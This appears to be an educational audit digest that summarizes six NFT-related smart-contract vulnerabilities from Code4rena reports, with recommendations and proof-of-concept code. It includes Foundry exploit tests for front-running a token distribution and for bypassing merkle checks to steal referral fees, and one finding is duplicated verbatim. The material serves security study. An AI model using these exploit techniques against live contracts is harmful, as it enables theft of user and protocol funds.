# ETAAcademy-Adudit: 5. NFT

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>05. NFT</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>NFT</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] Distribution can be bricked, and double claims by a few holders are possible when owner calls LiquidInfrastructureERC20::setDistributableERC20s

### Double claiming and bricking distribution

- Summary: Adding a new token can trigger reverts during distribution due to changes in array lengths, while attackers can front-run distribution, resulting in out-of-bounds reverts. Additionally, holders can exploit front-running to distribute rewards and back-run to claim rewards, leading to double claiming and losses for other holders.

- Impact & Recommendation: Removing tokens can cause a loss of token balance until re-added by the owner. To mitigate these risks, it's essential to validate **`setDistributableERC20s`** to prevent changes before distributions occur.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#m-03--distribution-can-be-bricked-and-double-claims-by-a-few-holders-are-possible-when-owner-calls-liquidinfrastructureerc20setdistributableerc20s) & [Report](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.12;
    import {Test, console2} from "forge-std/Test.sol";
    import {LiquidInfrastructureERC20} from "../contracts/LiquidInfrastructureERC20.sol";
    import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    contract AltheaTest is Test {
        function setUp() public {}
        function test_POC() public {
            // setup
            LiquidInfrastructureNFT nft = new LiquidInfrastructureNFT("LP");
            address[] memory newErc20s = new address[](1);
            uint256[] memory newAmounts = new uint[](1);

            ERC20 DAI = new ERC20("DAI", "DAI");
            ERC20 USDC = new ERC20("USDC", "USDC");
            string memory _name = "LP";
            string memory _symbol = "LP";
            uint256 _minDistributionPeriod = 5;
            address[] memory _managedNFTs = new address[](1);
            address[] memory _approvedHolders = new address[](2);
            address[] memory _distributableErc20s = new address[](1);
            _managedNFTs[0] = address(nft);
            _approvedHolders[0] = address(1);
            _approvedHolders[1] = address(2);
            _distributableErc20s[0] = address(DAI);
            newErc20s[0] = address(DAI);
            nft.setThresholds(newErc20s, newAmounts);
            LiquidInfrastructureERC20 erc = new  LiquidInfrastructureERC20(
                _name, _symbol, _managedNFTs, _approvedHolders, _minDistributionPeriod, _distributableErc20s);
            erc.mint(address(1), 100e18);
            erc.mint(address(2), 100e18);
            // issue ==  change in desirable erc20s
            _distributableErc20s = new address[](2);
            _distributableErc20s[0] = address(DAI);
            _distributableErc20s[1] = address(USDC);
            newAmounts = new uint[](2);
            newErc20s = new address[](2);
            newErc20s[0] = address(DAI);
            newErc20s[1] = address(USDC);
            nft.setThresholds(newErc20s, newAmounts);
            deal(address(DAI), address(erc), 1000e18);
            deal(address(USDC), address(erc), 1000e18);
            vm.roll(block.number + 100);
            // frontrun tx
            erc.distribute(1);
            // victim tx
            erc.setDistributableERC20s(_distributableErc20s);
            // backrun tx
            vm.roll(block.number + _minDistributionPeriod);
            vm.expectRevert(); // Index out of bounds
            erc.distribute(1);
        }
    }

  ```

  </details>

## 2.[High] Function refinanceFromLoanExecutionData() does not check executionData.tokenId == loan.nftCollateralTokenId

### Check tokenId

- The `refinanceFromLoanExecutionData()` function in the contract allows borrowers to refinance their loans using new offers without transferring the NFT collateral out of the protocol. However, this function does not check if the `executionData.tokenId` matches the `loan.nftCollateralTokenId`, potentially leading to a situation where the new loan has a collateral NFT that does not match what the lender requested in their offers.

- Impact & Recommendation: Add a check to ensure `executionData.tokenId` is equal to `loan.nftCollateralTokenId`.
  <br> 🐬: [Source](<https://code4rena.com/reports/2024-04-gondi#h-04-Function-refinanceFromLoanExecutionData()-does-not-check-executionData.tokenId-==-loan.nftCollateralTokenId>) & [Report](https://code4rena.com/reports/2024-04-gondi)

<details><summary>POC</summary>

```solidity

  function _processOffersFromExecutionData(
    address _borrower,
    address _principalReceiver,
    address _principalAddress,
    address _nftCollateralAddress,
    uint256 _tokenId,
    uint256 _duration,
    OfferExecution[] calldata _offerExecution
) private returns (uint256, uint256[] memory, Loan memory, uint256) {
  ...
  _validateOfferExecution(
      thisOfferExecution,
      _tokenId,
      offer.lender,
      offer.lender,
      thisOfferExecution.lenderOfferSignature,
      protocolFee.fraction,
      totalAmount
  );
  ...
}

function _checkValidators(LoanOffer calldata _loanOffer, uint256 _tokenId) private {
    uint256 offerTokenId = _loanOffer.nftCollateralTokenId;
    if (_loanOffer.nftCollateralTokenId != 0) {
        if (offerTokenId != _tokenId) {
            revert InvalidCollateralIdError();
        }
    } else {
        uint256 totalValidators = _loanOffer.validators.length;
        if (totalValidators == 0 && _tokenId != 0) {
            revert InvalidCollateralIdError();
        } else if ((totalValidators == 1) && (_loanOffer.validators[0].validator == address(0))) {
            return;
        }
        for (uint256 i = 0; i < totalValidators;) {
            IBaseLoan.OfferValidator memory thisValidator = _loanOffer.validators[i];
            IOfferValidator(thisValidator.validator).validateOffer(_loanOffer, _tokenId, thisValidator.arguments);
            unchecked {
                ++i;
            }
        }
    }
}

```

</details>

## 3.[High] Function refinanceFromLoanExecutionData() does not check executionData.tokenId == loan.nftCollateralTokenId

### Check tokenId

- Summary: The `refinanceFromLoanExecutionData()` function in the contract allows borrowers to refinance their loans using new offers without transferring the NFT collateral out of the protocol. However, this function does not check if the `executionData.tokenId` matches the `loan.nftCollateralTokenId`, potentially leading to a situation where the new loan has a collateral NFT that does not match what the lender requested in their offers.

- Impact & Recommendation: Add a check to ensure `executionData.tokenId` is equal to `loan.nftCollateralTokenId`.
  <br> 🐬: [Source](<https://code4rena.com/reports/2024-04-gondi#h-04-Function-refinanceFromLoanExecutionData()-does-not-check-executionData.tokenId-==-loan.nftCollateralTokenId>) & [Report](https://code4rena.com/reports/2024-04-gondi)

<details><summary>POC</summary>

```solidity
function _processOffersFromExecutionData(
    address _borrower,
    address _principalReceiver,
    address _principalAddress,
    address _nftCollateralAddress,
    uint256 _tokenId,
    uint256 _duration,
    OfferExecution[] calldata _offerExecution
) private returns (uint256, uint256[] memory, Loan memory, uint256) {
  ...
  _validateOfferExecution(
      thisOfferExecution,
      _tokenId,
      offer.lender,
      offer.lender,
      thisOfferExecution.lenderOfferSignature,
      protocolFee.fraction,
      totalAmount
  );
  ...
}


function _checkValidators(LoanOffer calldata _loanOffer, uint256 _tokenId) private {
    uint256 offerTokenId = _loanOffer.nftCollateralTokenId;
    if (_loanOffer.nftCollateralTokenId != 0) {
        if (offerTokenId != _tokenId) {
            revert InvalidCollateralIdError();
        }
    } else {
        uint256 totalValidators = _loanOffer.validators.length;
        if (totalValidators == 0 && _tokenId != 0) {
            revert InvalidCollateralIdError();
        } else if ((totalValidators == 1) && (_loanOffer.validators[0].validator == address(0))) {
            return;
        }
        for (uint256 i = 0; i < totalValidators;) {
            IBaseLoan.OfferValidator memory thisValidator = _loanOffer.validators[i];
            IOfferValidator(thisValidator.validator).validateOffer(_loanOffer, _tokenId, thisValidator.arguments);
            unchecked {
                ++i;
            }
        }
    }
}

```

</details>

## 4.[High] update_emergency_council_7_D_0_C_1_C_58() updates nft manager instead of emergency council

### Updates emergency council

- Summary: The function `update_emergency_council_7_D_0_C_1_C_58()` in Seawater's `lib.rs` file, intended to update the emergency council responsible for managing protocol shutdowns, mistakenly updates the `nft_manager` instead. This error prevents the proper updating of the emergency council, which could hinder the protocol's ability to respond to emergency situations, compromising its security and stability.

- Impact & Recommendation: The solution is to replace `self.nft_manager.set(manager)` with `self.emergency_council.set(manager)` to ensure the function performs its intended role.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-08-superposition#h-01-update_emergency_council_7_d_0_c_1_c_58-updates-nft-manager-instead-of-emergency-council) & [Report](https://code4rena.com/reports/2024-08-superposition)

<details><summary>POC</summary>

```rust

  pub fn update_emergency_council_7_D_0_C_1_C_58(
            &mut self,
            manager: Address,
        ) -> Result<(), Revert> {
            assert_eq_or!(
                msg::sender(),
                self.seawater_admin.get(),
                Error::SeawaterAdminOnly
            );
            self.nft_manager.set(manager);
            Ok(())
        }

  pub fn update_nft_manager_9_B_D_F_41_F_6(&mut self, manager: Address) -> Result<(), Revert> {
        assert_eq_or!(
            msg::sender(),
            self.seawater_admin.get(),
            Error::SeawaterAdminOnly
        );
        self.nft_manager.set(manager);
        Ok(())
    }

```

</details>

## 5.[Medium] Lack of data validation when users are claiming their art allows malicious user to bypass signature/merkle hash to provide unapproved ref*, artId* and imageURI

### Bypass signature/merkle hash

- Summary: The `merkleClaim` function lacks validation for user-submitted parameters, specifically the referrer address (`ref_`), art ID (`artId_`), and image URI (`imageURI`). This vulnerability allows malicious users to bypass signature and Merkle hash checks, leading to significant security risks. Attackers can illegitimately modify `ref_` to steal referral fees, use inappropriate `artId_` to claim unauthorized art, and set invalid `imageURI` that points to unrelated artworks.

- Impact & Recommendation: It is recommended to implement checks on these parameters within the `merkleClaim` function to enhance contract security and user experience.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-08-phi#m-05-lack-of-data-validation-when-users-are-claiming-their-art-allows-malicious-user-to-bypass-signaturemerkle-hash-to-provide-unapproved-ref_-artid_-and-imageuri) & [Report](https://code4rena.com/reports/2024-08-phi)

<details><summary>POC</summary>

```solidity
function test_claimHack() public {
  bytes32 expectedRoot = 0xe70e719557c28ce2f2f3545d64c633728d70fbcfe6ae3db5fa01420573e0f34b;
  bytes memory credData = abi.encode(1, owner, "MERKLE", 31_337, expectedRoot);
  bytes memory signCreateData = abi.encode(expiresIn, ART_ID_URL_STRING, credData);
  bytes32 createMsgHash = keccak256(signCreateData);
  bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
  (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
  if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
  phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(
      signCreateData,
      abi.encodePacked(cr, cs),
      IPhiFactory.CreateConfig(participant, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false)
  );
  address Alice = participant; //Original file setup already deals `participant` enough ether to pay for mint fees
  address Alice_2 = address(0x123456); //Alice's account 2
  vm.startPrank(Alice);
  bytes32[] memory proof = new bytes32[](2);
  proof[0] = 0x0927f012522ebd33191e00fe62c11db25288016345e12e6b63709bb618d777d4;
  proof[1] = 0xdd05ddd79adc5569806124d3c5d8151b75bc81032a0ea21d4cd74fd964947bf5;
  address to = 0x1111111111111111111111111111111111111111;
  bytes32 value = 0x0000000000000000000000000000000003c2f7086aed236c807a1b5000000000;
  uint256 artId = 1;
  bytes memory data = abi.encode(artId, to, proof, Alice_2, uint256(1), value, IMAGE_URL2); // Within this line we have the freedom to decide artId, address of referral and the image URL
  bytes memory dataCompressed = LibZip.cdCompress(data);
  uint256 totalMintFee = phiFactory.getArtMintFee(artId, 1);
  phiFactory.claim{ value: totalMintFee }(dataCompressed);
  (, bytes memory response) = phiFactory.phiRewardsAddress().call(abi.encodeWithSignature("balanceOf(address)", Alice_2));
  uint256 balance = abi.decode(response, (uint256));
  console2.log("Alice_2: ", balance); //Alice successfully illegally receives referral fee through her second account
  vm.stopPrank();
}

```

</details>

## 6.[High] Attakers can steal the funds from long-term reservation

### long-term reservation

- Summary: Insufficient permission checks and rental fund management allows attackers to exploit setbidtobuy() and withdrawtolandlord() to steal funds from the protocol. Enhancing permission validation and restricting the auto-approve feature can effectively mitigate this issue and secure the protocol’s funds.

- Impact & Recommendation: Attackers can steal funds from the long-term reservation pool without incurring any losses, posing a severe threat to the protocol’s financial security. It is recommended to update the validation logic to use check\*can_approve instead of check_can_send to ensure that only authorized users can withdraw funds and restrict auto-Approve functionality.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-10-coded-estate#h-01-attakers-can-steal-the-funds-from-long-term-reservation) & [Report](https://code4rena.com/reports/2024-10-coded-estate)

<details><summary>POC</summary>

```rust

File: execute.rs#setbidtobuy()


675:             if token.sell.auto_approve {

676:                 // update the approval list (remove any for the same spender before adding)

677:                 let expires = Expiration::Never {  };

678:                 token.approvals.retain(|apr| apr.spender != info.sender);

679:                 let approval = Approval {

680:                     spender: info.sender.clone(),

681:                     expires,

682:                 };

683:                 token.approvals.push(approval);

684:

685:             }

File: execute.rs


1787:     pub fn withdrawtolandlord(

/**CODE**/

1796:         address:String

1797:     ) -> Result<Response<C>, ContractError> {

/**CODE**/

1848:             .add_message(BankMsg::Send {

1849:                 to_address: address,

1850:                 amount: vec![Coin {

1851:                     denom: token.longterm_rental.denom,

1852:                     amount: Uint128::from(amount) - Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000),

File: execute.rs#withdrawtolandlord()


1832:                 if item.deposit_amount - Uint128::from(token.longterm_rental.price_per_month) < Uint128::from(amount)  {

1833:                     return Err(ContractError::UnavailableAmount {  });

1834:                 }

```

</details>
